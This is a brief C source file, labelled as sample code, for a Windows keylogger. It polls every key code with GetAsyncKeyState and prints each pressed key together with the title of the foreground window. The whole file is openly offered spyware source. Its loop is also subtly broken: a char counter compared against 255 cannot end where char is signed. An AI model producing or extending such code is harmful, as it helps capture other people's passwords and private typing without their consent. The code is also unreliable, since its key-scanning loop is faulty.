/* 20 line keylogger sample code for windows */
#include <stdio.h>
#include <windows.h>
int main(){
  while(1){
    for(char c = 0;c < 255; c++){
      SHORT rv = GetAsyncKeyState(c);
      if(rv == -32767){
        HWND fg = GetForegroundWindow();
        if(fg){
          char title[256];
          GetWindowText(fg,title,256);
          printf("[%s]-0x%x\n",title,c);
        }
      }
    }
    Sleep(20);
  }
  return 0;
}
